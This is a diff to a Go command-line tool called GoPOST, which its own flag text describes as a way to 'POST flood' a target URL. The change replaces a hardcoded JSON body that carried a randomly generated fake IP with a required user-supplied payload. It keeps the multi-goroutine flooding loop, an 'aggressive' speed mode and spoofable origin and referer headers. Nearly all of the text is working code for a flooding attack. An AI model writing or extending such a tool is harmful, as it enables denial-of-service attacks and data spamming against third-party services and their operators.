@@ -37,7 +37,7 @@ func randomIpAddress() string {
 	return net.IP(buf).String()
 }
 
-func SendRandomData(url string, threadnum int, verbose bool, aggressive bool, origin string, referer string) {
+func SendRandomData(url string, payload string, threadnum int, verbose bool, aggressive bool, origin string, referer string) {
 	defer wg.Done()
 	if verbose && !aggressive {
 		fmt.Printf("[THREAD #%d] Starting...\n", threadnum)
@@ -48,12 +48,10 @@ func SendRandomData(url string, threadnum int, verbose bool, aggressive bool, or
 			fmt.Printf("[THREAD #%d] URL:>%s\n", threadnum, url)
 		}
 
-		var jsonStr = []byte(`{"ip":"` + randomIpAddress() + `","source":"prt.is-a.dev","path":"/"}`)
-
 		if verbose && !aggressive {
-			fmt.Printf("[THREAD #%d] JSON:>%s\n", threadnum, string(jsonStr))
+			fmt.Printf("[THREAD #%d] JSON:>%s\n", threadnum, payload)
 		}
-		req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonStr))
+		req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(payload)))
 		req.Header.Set("Content-Type", "application/json")
 		if origin != "" {
 			req.Header.Set("origin", origin)
@@ -100,6 +98,7 @@ func SendRandomData(url string, threadnum int, verbose bool, aggressive bool, or
 }
 func main() {
 	urlPtr := flag.String("url", "", "URL to POST flood.")
+	payloadPtr := flag.String("payload", "", "Payload to send via POST flood.")
 	originPtr := flag.String("origin", "", "(Optional) URL to value the origin header with.")
 	refererPtr := flag.String("referer", "", "(Optional) URL to value the referer header with.")
 	threadsPtr := flag.Int("threads", 16, "Number of goroutines to use.")
@@ -113,8 +112,14 @@ func main() {
 		os.Exit(1)
 	}
 
+	if *payloadPtr == "" {
+		fmt.Println("[ERROR] Payload is required.")
+		os.Exit(1)
+	}
+
 	fmt.Println("GoPOST v1.0.0 starting...")
 	fmt.Printf("URL: %s\n", *urlPtr)
+	fmt.Printf("Payload: %s\n", *payloadPtr)
 	fmt.Printf("Threads: %d\n", *threadsPtr)
 	fmt.Printf("Verbose: %t\n", *verbosePtr)
 	fmt.Printf("Aggressive: %t\n", *speedModePtr)
@@ -123,7 +128,7 @@ func main() {
 
 	for i := 0; i < *threadsPtr; i++ {
 		wg.Add(1)
-		go SendRandomData(*urlPtr, i+1, *verbosePtr, *speedModePtr, *originPtr, *refererPtr)
+		go SendRandomData(*urlPtr, *payloadPtr, i+1, *verbosePtr, *speedModePtr, *originPtr, *refererPtr)
 	}
 	wg.Wait()
 }
